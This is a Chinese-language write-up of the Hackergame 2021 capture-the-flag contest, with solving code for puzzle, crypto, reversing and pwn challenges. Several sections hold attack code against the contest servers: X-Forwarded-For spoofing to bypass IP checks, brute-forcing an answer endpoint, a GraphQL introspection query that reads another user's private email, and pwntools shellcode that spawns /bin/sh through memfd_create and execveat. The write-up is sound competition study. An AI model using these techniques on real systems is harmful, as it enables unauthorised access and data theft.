# Write up for Hackergame2021

## 签到

随便点点，发现page是UNIX时间戳，改成 `Math.floor(Date.now() / 1000)` 即可。

例如 `http://202.38.93.111:10000/?page=1635557347`。

## 进制十六——参上

图片右边被遮住了但是左边没有，所以直接把左边HEX复制出来并输出：

```php
<?php
    echo hex2bin("...");
```

PS: 用 QQ 去 OCR 时发现还有识别出错的#

## 去吧！追寻自由的电波

首先搜索 wireless alphabet 等关键词得到一个单词对应字母的列表（例如：https://en.battlestarwikiclone.org/wiki/Colonial_wireless_alphabet）。

听了半天得到一部分单词，发现并不听得懂emmm

提示说一定是清晰的，遂考虑做变换。

从 p😭q 提供的代码里得知 librosa，遂做一定变换：

```python
import librosa
import librosa.display
import soundfile as sf

y,sr = librosa.load("radio.mp3")	#y为长度等于采样率sr*时间的音频向量
sf.write('new_radio.wav', -y, sr // 4)
```

这里改采样率是因为原来太块了，听不清。考虑改成 -y 是因为这是网上某个例子里的最简单的。

## 猫咪问答 Pro Max

（当时没有记录，只有大概回忆）

第一题的网页打不开了但 https://web.archive.org/ 上有，找到章程，找到日期。

第二题在USTCLUG的博客上有，不过好像博客上少写了一年？（写4不对猜5过了）

第三题在网上大力找活动室图片后找到一张图，数了数确实是27个字母。

第四题从 SIGBOVIK 2021 上下载论文集，找到这篇论文，实验小节的大意是以下若干一个图片对应一个数据集，数图片标号的数量即可。

第五题搜 RFC Protocol Police，找到对应小节。好像又是个愚人节RFC？

## 卖瓜

首先尝试小数、负数无果，遂考虑溢出。

首先瞎JB试了下发现似乎是64位数。（每次把结果放进输入框）

然后扩欧求解（考虑 $2^{64}$ 隐藏的系数为1，使得右边可被3整除）
$$
6x+9y=20\pmod{2^{64}}
$$
可能是负数，但我们知道当有一个解时，可以找到其他所有解：

对于 $ax+by=gcd(a,b)\pmod p$，有 $x'=x+kb/gcd(a,b),y'=y-ka/gcd(a,b)$。

其中 $k$ 可设置为任意整数

然后发现填着填着变浮点数了？？？可前面我确实观察到溢出了啊。

多次尝试后发现了一种绝妙的填法，得到了flag（太懒，没有记录下来，大概就是每次填一点点）。

PS: 看题解才发现是按 php 的规则变浮点数的。

## 透明的文件

不要用 cmd 遂打开 Windows Terminal。

\[39m 这个看旧版 node.js 的时候很熟悉啊。

回（bai）忆（du）了一下发现前面还缺个 `\e`。

补完后在WSL用echo -e输出了发现什么都没有输出，当时有一些字符被遮掉了。

遂先填满屏幕再输出，发现轮廓就是flag。

```shell
# 填充
echo -e "\e[0;0\u25a0\u25a0...\u25a0\u25a0"
export PS1=
# 输出
echo -e "\e[0;0H\e[20;58H\e[8;34H\e[13;27..."
```

PS：看题解似乎把空格改成别的还能看到色彩。

## 旅行照片

Google 了 IM2GPS 之类的东西没找到现成的。Google 地图的拍照记录功能给了我个错误地址（似乎是错误的基于IP的定位？）让我找了半天。

最后还是从图片出发，天蓝色KFC是甜品店啊，后来搜 KFC 甜品店 海边 的时候发现甜品店怎么不是这个颜色的？

原来天蓝色的KFC还有特别的品牌冠名，没几家，还有网红打卡。

遂用 百度全景（里面还没这个KFC）、打开图片等内容推断出最后两问，前两问也能按照全景、树叶长势和阴影猜个大概。第三题没找对水平线（直接把图片当成水平拍的了），猜错了楼层。

看到验证方式似乎是在鼓励爆破？（不是动态服务器）

遂爆破得到答案（没把14层列入搜索范围又找了好久😭）

```js
1=a&2=a&3=10&4=0335-7168800&5=%E6%B5%B7%E8%B1%9A%E9%A6%86.txt

for (let a of 'abcdefgh') {
	for (let b of 'abcde') {
		for (let i = 5; i <= 14; i++) {
			await new Promise(res => $.ajax(btoa('1=' + encodeURIComponent(a) + '&2=' + encodeURIComponent(b) + '&3=' + encodeURIComponent(i.toString()) + '&4=0335-7168800&5=%E6%B5%B7%E8%B1%9A%E9%A6%86') + '.txt').done((x) => console.log('bingo', x)).fail(res))
		}
	}
}

// flag{D0n7-5hare-ph0t05-ca5ua11y}

// 1=b&2=e&3=14&4=0335-7168800&5=%E6%B5%B7%E8%B1%9A%E9%A6%86
```

## FLAG 助力大红包

前端验证是前端读取别人家后端验证的结果后提交，这个很容易改，后端验证用经典的X-Forwarded-For也可以bypass。

然后就把每个/8网段都随机个ip提交一波。

发现访问过于频繁好几次了还不好？

最后似乎修过后好用了。

经过多次验证发现2s提交一次不会触发流控。

```javascript
for (let i = 0; i < 256; i++) {
		let ip = i + "." + i + '.' + i + '.44';
		await (fetch("http://202.38.93.111:10888/invite/50a9cb2a-b0d9-4e60-8b2e-b6b7ea534647", {
  "headers": {
    "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "cache-control": "max-age=0",
    "content-type": "application/x-www-form-urlencoded",
    "upgrade-insecure-requests": "1","X-Forwarded-For":ip
  },
  "referrer": "http://202.38.93.111:10888/invite/e267242f-5935-476a-8170-a02fe831c63c",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "ip="+ip,
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
}))

await new Promise(x => setTimeout(x, 100));
}
```

## Amnesia

第一题想办法不要让字符串出现在 data 里就行：

```c
#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    // 注意 char *str 会把后面的字符串编译到常量池里
	char str[] = "Hello, world!\n";
	int ret = write(1, str, 14);
	_exit(0);
}
```

第二题给我整崩溃了，gdb 看到 .text 开头就崩溃（又是找改eax初始值的方法（似乎Linux内核启动线程的时候会初始化为0？不清楚后面为什么会改成特定值？linker干的？），又是找改entry的方法（让entry改成非\_start）,又是找覆盖\_start符号的方法，皆未果）

后来说在 ustclug/debian:10 里eax初始指向stack上可写的部分？？？

## 图之上的信息

guest 登进去发现一个调 graphql 的的接口。

找了半天文档发现有查询元信息的方法：

```javascript
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "content-type": "application/json"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": "{\"query\":\"query { __schema {    types {      name    }  } }\"}",
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// 发现 Guser
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "content-type": "application/json"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query: `query {
  __type(name: "GNote") {
    name
    kind
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// 发现 privateEmail
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "content-type": "application/json"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
    // 猜 uid = 1
  "body": JSON.stringify({query: `query {
  GUser(id: 1) {
    id, privateEmail
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
// 错误提示用 user 查
fetch("http://202.38.93.111:15001/graphql", {
  "headers": {
    "accept": "application/json, text/plain, */*",
    "accept-language": "zh-CN,zh;q=0.9,en;q=0.8",
    "content-type": "application/json"
  },
  "referrer": "http://202.38.93.111:15001/notes",
  "referrerPolicy": "strict-origin-when-cross-origin",
  "body": JSON.stringify({query: `query {
  user(id: 1) {
    id, privateEmail
  }
}`}),
  "method": "POST",
  "mode": "cors",
  "credentials": "include"
});
```

PS：赛后看题解发现似乎查询名称也可以用正常方法查到，不需要看错误信息

```graphql
{
  __schema {
    queryType {
      name
      fields {
        name
        args {
          name
        }
      }
    }
  }
}
```

## Easy RSA

（源码已丢失）

p 是 $(y-small)! \pmod y$ 发现 y 是素数，所以用威尔逊定理求得 $(y-1)! \pmod y$ 后倒推。

q 这里用 sympy.prevprime 倒推（或者前面一个一个用Miller-Rabin试）

后面用 value_q 倒退 q = getPrime(512) （注意返回的是sympy.nextprime(q)）的值用e对$\phi(n)$求逆当d即可（或者看作某种扩展形式的RSA）。

得知pq后算d算c即可。

PS：~~什么*CPC题~~

## 加密的 U 盘

按流程（fdisk + cryptsetup luksOpen + fdisk + mount）（百度去年的LUKS题）走一遍day1的加载。

这里发现密钥可以有多个，每个都可以打开，可实际数据肯定只有一种加密，怎么回事呢？（毕竟数据可没法验证环签名）

给了两个文件，所以拖到 BCompare 里看看，发现只有开头和后面的一小部分不同。但前面流程的最后一步提到实际数据就在后面而不是前面。(后面大部分相同说明实际加密的密钥相同)

所以把前面直接复制过来。

```python
with open('day1.0.My Disk.img', 'rb') as f1:
    d1 = f1.read()

with open('day2.0.My Disk.img', 'rb') as f2:
    d2 = f2.read()

nd = d1[0:0xc1000] + d2[0xc1000:]

with open('dayX.img', 'wb') as f:
    f.write(nd)
```

然后按流程打开。

通过flag得知它改的是ring上的密钥，LUKS里这个密钥解密得到master key再用master key解密真正的信息。从而解答了我的疑惑。

PS: 读题解发现有dump-master-key而不是暴力combine的做法。

## 赛博厨房

题目规则比较模糊，具体看代码（由于有map文件，所以devtool里可以看到webpack前的更友好的源码）。

玩几次发现前两题不会变。

第一题就走过去、放进去就可以了。

第二题发现还有代码长度限制。用“如果手上的物品大于等于 n 向下跳转 m 行”构造一个循环即可。

第三题发现我要预言下一天的情况，而且明明一开始下一天都不变，我加上代码就变了。

最后发现是按所有程序的 SHA256 的 SHA256 来当 seed 算出结果的。

搜索空间是 $32^6/128$ （每次可以打包128个程序一起来）貌似还可以。

这里只随机构造一次程序，后面靠打乱循序来改变最终的 seed，减少运算。

代码如下：

```javascript
import CryptoJS from 'crypto-js';
import arrayShuffle from 'array-shuffle';
import seedrandom from 'seedrandom'
import fs from 'fs';
function generatePos() {
    let ans = '', mark = [];
    for (let i = 0; i < 8; i++) {
        const idx = Math.floor(Math.random() * 128);
        ans += `向右 ${idx + 1} 步
拿起 1 个物品
向左 ${idx + 1} 步
放下 1 个物品
`;
        mark.push(idx);
    }
    return [mark.join(','), ans];
}


const see = new Map(), arr = [], ha = [];
for (let i = 0; i < 128; i++) {
    const [mark, ans] = generatePos();
    see.set(mark, i);
    arr.push(ans);
    const hash = CryptoJS.SHA256(ans.trim()).toString(CryptoJS.enc.Hex);
    ha.push(hash);
    console.log(mark, hash);
}

let idx = new Array(128).fill(0).map((_, i) => i);
let tries = 0;
while (true) {
    tries ++;
    if (tries % 10000 == 0) console.log(tries);
    idx = arrayShuffle(idx);
    let seed = CryptoJS.SHA256(idx.map(v => ha[v]).join('\n')).toString(CryptoJS.enc.Hex);
    let range = 128;
    let length = 8;
    let prng = seedrandom(seed);
    let recipe = [];
    for (let i = 0; i < length; i++) {
        let r = prng.int32() % range;
        recipe.push(r);
    }
    recipe = recipe.map(x => (x + range) % range);
    let key = recipe.join(',');
    if (see.has(key)) {
        console.log('has key: ', key);
        fs.writeFileSync('ans' + Math.random() + '.json', JSON.stringify({
            token: '',
            level: 2,
            seed: seed,
            programs: idx.map(v => arr[v]),
            executions: [idx.indexOf(see.get(key))],
          }));
        break;
    }
}
```

PS：~~感觉像在挖矿~~。第四题用这个方法~~可能要较多的矿机~~。

第四题再玩了几盘发现清理厨房不会清理掉盘子。

然后 有盘子的地方丢x个拿x个手里数量不变，当其他地方就会少了x个。

而空地有56个。这就比较明显了，先用若干个程序放盘子，把菜谱（恰好可编码为 56 bit）传递给最后一个程序读取并执行。

然后就是构思怎样的程序不会超行数限制的事情了…

注意到PC、你拿的物品ID、你拿的物品数量是可以作为程序状态的。

构思了很久，最后使用的一个方法是通过丢64个拿64个直到丢1个拿1个得到物品ID，然后走到第一排一路丢到手里没物品，然后拿走对应物品去放。

这里的问题是放一个就几乎占满72行的限制了，所以必须用循环，但是每次读取物品ID的时候又必须有个状态信息（决定读取哪里的8个盘子的信息）。

最后决定留第一个盘子放的物品数量来表示这个信息（要求第一个物品ID必须>63，所以需要搜索一下（搜索空间才2，直接手动try几次即可））。

生成程序如下：

```javascript
import CryptoJS from 'crypto-js';
import arrayShuffle from 'array-shuffle';
import seedrandom from 'seedrandom'
import fs from 'fs';

function resultFromScripts(scrs) {
    let seed = CryptoJS.SHA256(scrs.map(s => CryptoJS.SHA256(s.trim()).toString(CryptoJS.enc.Hex)).join('\n')).toString(CryptoJS.enc.Hex);
    let range = 128;
    let length = 8;
    let prng = seedrandom(seed);
    let recipe = [];
    for (let i = 0; i < length; i++) {
        let r = prng.int32() % range;
        recipe.push(r);
    }
    recipe = recipe.map(x => (x + range) % range);
    return [seed, recipe];
}

const scrs = [];
for (let i = 0; i < 56; i++) {
    scrs.push(`向下 1 步
向右 ${i} 步
放下盘子`);
}

let scr = [];
{
    scr.push('拿起 127 个物品');
    scr.push('向下 1 步');
    for (let v of [64, 32, 16, 8, 4, 2, 1]) {
        scr.push('放下 ' + v + ' 个物品');
        scr.push('拿起 ' + v + ' 个物品');
        scr.push('向右 1 步');
    }
    scr.pop();

    scr.push('向左 999 步');
    scr.push('向上 1 步');

    scr.push('如果手上的物品大于等于 1 向下跳转 2 行');
    scr.push('如果手上的物品大于等于 0 向下跳转 4 行');
    scr.push('放下 1 个物品');
    scr.push('向右 1 步');
    scr.push('如果手上的物品大于等于 0 向上跳转 4 行');

    scr.push('拿起 1 个物品');

    scr.push('向右 999 步');
    scr.push('向下 1 步');
    scr.push('放下 1 个物品');

    scr.push('向左 999 步');
    
    // scr.push('向下 1 步');
    // scr.push('向左 999 步');

    for (let i = 0; i < 7; i++) scr.push('拿起 1 个物品');
    scr.push('向上 1 步');
    scr.push('拿起 128 个物品');
    scr.push('向下 1 步');
    for (let i = 0; i < 7; i++) {
        scr.push(`如果手上的物品大于等于 ${i + 2 + 127} 向下跳转 4 行`);
        scr.push('放下 ' + (i + 1) + ' 个物品');
        scr.push(`向右 ${i * 7 + 7} 步`);
        scr.push('如果手上的物品大于等于 0 向上跳转 ' + (scr.length - 2) + ' 行');
    }
}
scrs.push(scr.join('\n'));

scrs.push('向右 324 步');

let [seed, recipe] = resultFromScripts(scrs);
let executions = [];
console.log(recipe);
let j = 0;
for (let i = 0; i < 8; i++) {
    let v = recipe[i];
    if (v >= 64) {
        v -= 64;
        executions.push(j);
    }
    j++;
    if (v >= 32) {
        v -= 32;
        executions.push(j);
    }
    j++;
    if (v >= 16) {
        v -= 16;
        executions.push(j);
    }
    j++;
    if (v >= 8) {
        v -= 8;
        executions.push(j);
    }
    j++;
    if (v >= 4) {
        v -= 4;
        executions.push(j);
    }
    j++;
    if (v >= 2) {
        v -= 2;
        executions.push(j);
    }
    j++;
    if (v >= 1) {
        v -= 1;
        executions.push(j);
    }
    j++;
}
executions.push(j);
fs.writeFileSync('ans2.js', "axios.post('/verify', " + JSON.stringify({
    token: 'TOKEN',
    level: 3,
    seed: seed,
    programs: scrs,
    executions
}) + ");");
fs.writeFileSync('ans2.json', JSON.stringify({
    token: 'TOKEN',
    level: 3,
    seed: seed,
    programs: scrs,
    executions
}));
```

PS：题解用的状态盘子竟然比我多。

## 灯，等灯等灯

~~啊，经典的*CPC题，我还知道一个绝妙的 $O(n^3)$(注意n是长或宽，不是$O((n^2)^3)$)的高斯消元方法，SWERC考过。(拿不到flag的flag+1)~~

第一题还是直接用 z3-solver 求解。

```python
from z3 import *

s = Solver()

ll = 12

x = []
y = []
for i in range(ll):
    ix = []
    y.append([0] * ll)
    for j in range(ll):
        ix.append(BitVec("x_%d_%d" % (i, j), 8))
    x.append(ix)

print('\n'.join([''.join([('0' if type(w) == BitVecNumRef else '1') for w in v]) for v in x]))

acc = [[189,189,189,189,189,33,33,33,189,189,189,189],[189,189,189,33,33,33,189,33,44,189,189,189],[189,189,189,189,189,33,33,33,33,189,189,189],[189,189,189,189,189,33,189,33,33,189,189,189],[189,189,189,33,33,189,189,33,33,33,189,189],[189,134,33,33,189,189,189,189,33,33,189,189],[189,144,33,33,189,189,189,189,33,189,189,189],[189,142,33,33,189,189,189,189,33,33,33,189],[189,100,142,33,189,189,189,189,33,33,33,189],[189,142,142,189,189,189,189,189,189,33,189,189],[189,59,142,33,189,189,189,189,33,189,189,189],[189,189,33,33,189,189,189,189,189,189,189,189]]
rel = [[0,0,1,0,0],[0,0,2,0,0],[1,2,3,2,1],[0,0,2,0,0],[0,0,1,0,0]]
for i in range(ll):
    for j in range(ll):
        for q in range(5):
            for w in range(5):
                rx = i + q - 2
                ry = j + w - 2
                if 0 <= rx < ll and 0 <= ry < ll and rel[q][w] != 0:
                    y[rx][ry] = y[rx][ry] + rel[q][w] * x[i][j]

def absSub(x, y):
    return If(x >= y,x - y,y - x)

ss = 0

for i in range(ll):
    for j in range(ll):
        #print(33 + acc[i][j], -33 + acc[i][j])
        #if type(x[i][j]) != BitVecNumRef:
        s.add(y[i][j] == acc[i][j]) # "cond_%d_%d" % (i, j)


print(s.check())
m = s.model()
print([ [ m.evaluate(x[i][j]) for j in range(ll) ] for i in range(ll) ])
```

后面求解不出来了。

写了一套随机搜索(大概像是模拟退火)程序，懒得改了，大概如下：

```cpp
#include <bits/stdc++.h>
using namespace std;
const int UUA = 10;
int best_ans = 40000;
random_device rd;
mt19937 mt(rd());
#define rand() (mt())
struct FF {
const int rreal[12][12] = {{189,189,189,189,189,33,33,33,189,189,189,189},{189,189,189,33,33,33,189,33,44,189,189,189},{189,189,189,189,189,33,33,33,33,189,189,189},{189,189,189,189,189,33,189,33,33,189,189,189},{189,189,189,33,33,189,189,33,33,33,189,189},{189,134,33,33,189,189,189,189,33,33,189,189},{189,144,33,33,189,189,189,189,33,189,189,189},{189,142,33,33,189,189,189,189,33,33,33,189},{189,100,142,33,189,189,189,189,33,33,33,189},{189,142,142,189,189,189,189,189,189,33,189,189},{189,59,142,33,189,189,189,189,33,189,189,189},{189,189,33,33,189,189,189,189,189,189,189,189}};
const int eff[5][5] = {{0,0,1,0,0},{0,0,2,0,0},{1,2,3,2,1},{0,0,2,0,0},{0,0,1,0,0}};
int basic[12][12] = {{1310,1362,564,372,1193,722,2517,1031,385,945,1134,477},
{1140,974,615,637,278,1001,602,484,206,335,1410,585},
{932,515,0,1161,0,610,530,581,984,335,464,776},
{730,629,0,0,0,1213,1891,598,718,1027,445,453},
{1041,523,0,571,0,747,1655,338,727,733,993,701},
{1127,1216,1424,1166,1739,843,310,1003,697,475,836,1055},
{844,464,520,213,1223,783,707,0,0,0,1341,279},
{497,672,658,661,344,1200,1108,0,342,974,328,659},
{368,216,616,929,912,709,1028,0,572,0,479,208},
{567,1283,584,708,460,461,239,0,0,0,693,697},
{186,1141,424,298,705,668,532,1117,478,1150,882,224},
{1157,1416,371,843,773,939,519,852,398,1075,1602,565},
unsigned char res[12][12] = {{0}};
int dis[12][12] = {{0}};
bool ch[12][12] = {{0}};
bool mask[12][12] = {{0}};
#define disable_pos(a, b) {dis[a][b] = 1;basic[a][b] = 0;}
//#undef disable_pos
//#define disable_pos(a, b)
int ans = 0;
void oapply(int x, int y, int delta) {
	if (dis[x][y]) return;
	for (int i = 0; i < 5; i++) {
		for (int j = 0; j < 5; j++) {
			int px = x + i - 2;
			int py = y + j - 2;
			if (px < 0 || px >= 12 || py < 0 || py >= 12) continue;
			unsigned char o = res[px][py];
			res[px][py] += delta * eff[i][j];
			ans += abs(res[px][py] - rreal[px][py]) - abs(o - rreal[px][py]);
		}
	}
}
void apply(int x, int y, int delta) {
	if (dis[x][y]) return;
	basic[x][y] += delta;
	if (basic[x][y] < 0) basic[x][y] += 256, delta += 256;
	for (int i = 0; i < 5; i++) {
		for (int j = 0; j < 5; j++) {
			int px = x + i - 2;
			int py = y + j - 2;
			if (px < 0 || px >= 12 || py < 0 || py >= 12) continue;
			unsigned char o = res[px][py];
			res[px][py] += delta * eff[i][j];
			ans += abs(res[px][py] - rreal[px][py]) - abs(o - rreal[px][py]);
		}
	}
}
void CC();
void correctIt() {
	ans = 0;
	for (int i = 0; i < 12; i++) {
		for (int j = 0; j < 12; j++) {
			ans += rreal[i][j];
		}
	}
	for (int i = 0; i < 12; i++) {
		for (int j = 0; j < 12; j++) {
			oapply(i, j, basic[i][j]);
		}
	}
}
} ff, gg[UUA];
int rev[256][256];

void FF::CC() {
	for (int i = 0; i < 256; i++) {
		for (int j = 0; j < 256; j++) {
			int u = 0, v = i;
			while (v != j) {
				v = 31 + v;
				v &= 0xff;
				u++;
				if (u > 256) {
					u = 0;
					break;
				}
			}
			rev[i][j] = u;
		}
	}
	disable_pos(2, 2)
	disable_pos(2, 4)
	disable_pos(3, 2)
	disable_pos(3, 3)
	disable_pos(3, 4)
	disable_pos(4, 2)
	disable_pos(4, 4)

	disable_pos(6, 7)
	disable_pos(6, 8)
	disable_pos(6, 9)
	disable_pos(7, 7)
	disable_pos(8, 7)
	disable_pos(8, 9)
	disable_pos(9, 7)
	disable_pos(9, 8)
	disable_pos(9, 9)

	ans = 0;
	for (int i = 0; i < 12; i++) {
		for (int j = 0; j < 12; j++) {
			ans += rreal[i][j];
		}
	}
	for (int i = 0; i < 12; i++) {
		for (int j = 0; j < 12; j++) {
			oapply(i, j, basic[i][j]);
		}
	}
	printf("%d\n", ans);
	//return;
	int cc = 0, gga = 0;
	for(int i =0;i < UUA; i++) {
		memcpy(gg+i, &ff, sizeof(ff));
		// if (i < 4) {
		// 	memcpy(gg[i].basic, gba[i], sizeof(gba[i]));
		// 	gg[i].correctIt();
		// }
	}
	int iter = 0;
	while (ans > 400) {
		bool isok = true;
		while (isok) {
			isok = false;
			int oans = ans;
			for (int i = 0; i < 12; i++) {
				for (int j = 0; j < 12; j++) {
					if (ch[i][j]) {
						ch[i][j] = 0;
						continue;
					}
					apply(i, j, 1);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, -1);
					}
					//if (basic[i][j] > 0) {
						apply(i, j, -1);
						if (ans < oans) {
							oans = ans;
							isok = true;
						} else {
							apply(i, j, 1);
						}
					//}
//					/*
					
					
					apply(i, j, 64);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, -64);
					}
					apply(i, j, -64);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, 64);
					}

					apply(i, j, 32);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, -32);
					}
					apply(i, j, -32);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, 32);
					}

					apply(i, j, 171);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, -171);
					}
					apply(i, j, -171);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, 171);
					}
					
					
//					int rr = rev[basic[i][j] & 255][rreal[i][j]];
//					apply(i, j, rr);
//					if (ans < oans) {
//						isok = true;
//						oans = ans;
//					} else {
//						apply(i, j, -rr);
//					}
//					
					apply(i, j, 128);
					if (ans < oans) {
						isok = true;
						oans = ans;
					} else {
						apply(i, j, -128);
					}
					
					
				}
			}
        }
        gga++;
        if (ff.ans < best_ans) {
            best_ans = ff.ans;
            gga = 0;
            printf("{");
            for (int i = 0; i < 12; i++) {
                printf("{");
                for (int j = 0; j < 12; j++)
                    printf("%d%c", basic[i][j], ",}"[j == 11]);
                printf(",\n");
            }
            for (int i = 0; i < 12; i++) {
                printf("// {");
                for (int j = 0; j < 12; j++)
                    printf("%d%c", res[i][j], ",}"[j == 11]);
                printf(",\n");
            }
            puts("}");
        }
		bool uu = true;
		for (int i = 0; i < UUA; i++) if (gg[i].ans == ff.ans) {
			uu = false;
			break;
		}
		if (uu) {
			int order[] = {0, 1, 2, 3, 4, 6, 7, 8, 9, 11};
			random_shuffle(order, order + 10);
			for (int j = 0; j < UUA; j++) {
				int i = order[j];
				if (gg[i].ans > ff.ans) {
					memcpy(gg + i, &ff, sizeof(ff));
					break;
				}
			}
		}
        cc++;
		if (cc % 4 == 0) {
			memcpy(&ff, gg + (rand() % UUA), sizeof(ff));
		} else {
			for (int u = 0; u < 2; u++) {
				int p = rand() % 12;
				int w = rand() % 12;
				ch[p][w] = 1;
				//int aa[] = {1, 128, 3, 64, 2, 32, 171};
				// int delta = aa[rand() % 7] * (rand() % 2 ? 1 : 0);
				int delta = rand() % 10 - 5; 
//				if (basic[p][w] + delta >= 0)
					apply(p, w, delta); 
			}
		}
		if (cc % 1000 == 0) {
			printf("%d\n", best_ans);
		}
		//if (cc % 1000 == 0) exit(0);
	} 
	printf("%d\n", ans);
	printf("[");
	for(int i = 0; i < 12; i++) {
		printf("[");
		for (int j = 0; j < 12;j++) printf("%d%c", basic[i][j], ",]"[j == 11]);
		printf(",");
	}
	puts("]");
	for(int i = 0; i < 12; i++) {
		printf("// [");
		for (int j = 0; j < 12;j++) printf("%d%c", res[i][j], ",]"[j == 11]);
		printf(",");
	}
	puts("]");
}

int main() {
	unsigned int seed = time(0);
	srand(seed);
	ff.CC();
	gg[0].ans = 40000;
	printf("seed %u\n", seed);
}
```

比赛结束只跑出462/2089的解（分别对于后两问）。

于是gg😭，我不配当*CPCer😭，还好已经退役了。

PS：题解不是*CPC相关啊，那没事了。

## 只读文件系统

首先发现只要 execve 到新的程序，那么读到的结果就是新程序的内容。

经过大量的搜索和Dockerfile 的touch的提示下，了解到execve_at(或者execve(/dev/fd/%d)) 和 memfd_create 的强大之处。

然后就是如何把那么大的 hello 传进去了，shellcode里在调用一下read即可。

概念程序：

```cpp
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <fcntl.h>
#include <unistd.h>
#include <linux/memfd.h>
#include <sys/syscall.h>
#include <errno.h>
#include <sys/mman.h>

void anonyexec()
{
    int   fdm;
	void *addr;

	addr = mmap((void*)0x23335000, 0x4200, PROT_READ | PROT_WRITE | PROT_EXEC, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
    read(0, addr, 0x4168);
    fdm = syscall(__NR_memfd_create, "", MFD_CLOEXEC);
	printf("%d\n", fdm);
    ftruncate(fdm, 0x4168);
    write(fdm, addr, 0x4168);
	syscall(__NR_execveat, fdm, "", NULL, NULL, AT_EMPTY_PATH);
	printf("%d\n", errno);
}
 
int main()
{
	anonyexec();
    return 0;
}
```

exp脚本：

```python
from pwn import *

context(arch = 'amd64', os = 'linux') # , log_level = 'debug'

code = shellcraft.mov('rbx', 0x23335000)
code += shellcraft.linux.mmap_rwx(size = 0x4200, protection = 7, address = 'rbx')
code += shellcraft.linux.read(fd = 0, buffer = 'rbx', count = 0x4168)
code += shellcraft.pushstr('elf')
code += shellcraft.linux.syscall(319, 'rsp', 1)
code += shellcraft.mov('rcx', 'rax')
code += "\npush rcx\npush rcx\n"
code += shellcraft.linux.syscall('SYS_ftruncate', 'rcx', 0x4168)
code += "\npop rcx\n"
code += shellcraft.linux.write('rcx', 'rbx', 0x4168)
code += "\npop rcx\n"
code += shellcraft.pushstr('')
code += shellcraft.linux.syscall(322, 'rcx', 'rsp', 0, 0, 0x1000)
code += shellcraft.pushstr('/bin/sh')
code += shellcraft.linux.syscall(322, 'rcx', 'rsp', 0, 0, 0x1000)
code = asm(code)
print(len(code))
while len(code) < 0x1000:
    code += b'\x01'

code += open('hello', 'rb').read()

open('tool', 'wb').write(code)

r = remote('202.38.93.111', 10106)
r.sendlineafter('token:', 'TOKEN') # your token

r.send(code)
r.interactive()
```

## 一石二鸟

unsafe 那肯定没边界检查，一改，果然SegFault了。

Haskell的代码和编译结果太难看懂了~~

用源码编译了一个有更多调试信息的版本，慢慢调。

首先定位到每次生成的这个数组的地址几乎不变。

而在编译的代码里循环次数100已经写死了，newIORef是后面创建的也没法改。

不知道为什么我编译的程序main部分恰好可写，而题目所需的程序不行。

最后决定改指向数组的指针，似乎在一个看起来像stack的地方算出偏移，偏移挪动一下即可。

这些地址似乎多次运行都不会改变。

但是提交上去无事发生。最后发现在 docker 里的偏移和在 wsl1 里相差 0x10，遂更正之。

## Micro World

发现是个打包python，首先用 pyinstxtractor 解压打包。

然后发现没什么支持py3.9的反编译器？？？

找到pycdc反编译出来效果很差，逻辑缺失不少。

但是看到了节点数度数组，速度改成负的。

然后干脆把 2.pyc 改名为 u2.py，然后 `from u2 import value, next_pos_list, drawpoint, get_new_point, checkcrush, dotproduct, Point`。

这样只用还原主程序部分的逻辑（会弹出两次，前一次是u2内部调起pygame），这个大概学习下pygame即可。

```python
do_nothing = False
while running:
    clock.tick(FPS)
    screen.fill(BLACK)
    drawpoint(screen, Pointlist)
    if not do_nothing:
        Pointlist = next_pos_list(Pointlist)
    pygame.display.flip()
    for event in pygame.event.get():
        print(event)
        if event.type == pygame.QUIT:
            running = False
        elif event.type == pygame.KEYDOWN:
            do_nothing = True

pygame.quit()

# flag{Rev3sEtiM^5}
```

最后加个暂停功能。

## 卷王与野生的 GPA

看elf了一段时间，什么while(x>0x**); 看的我十分迷惑。

后来才意识到读的不是内存，而是IO。

搜索gba得到一个VisualBoyAdvance的程序。

然后IDA里看到比较感兴趣的就是decrypt函数。

我也不会操作VBA，甚至跑不起捕捉失败的动画来。

所以ELF里改调用init的地方为调用decrypt，把改好后的二进制用VBA的memory viewer功能手动patch到当前运行的gba中。

然后Reset游戏即可看到flag。

## 阵列恢复大师

经过一番搜索找到RAID恢复软件，发现并不能用，再找，发现要给出参数。

再找 RAID + CTF，找到一个根据一个莎士比亚剧本来得到RAID顺序的题目和RAID Reconstructor 5。

用后面的程序可以还原出可挂载的单个img。

RAID0可能又多个顺序均有可能，找到能挂在的即可。

注：我用 WinHex 复制出来的东西不完整 :(，必须挂载。

## 链上预言家

第一题找到solidity的官方文档里提到的算地址方法即可。

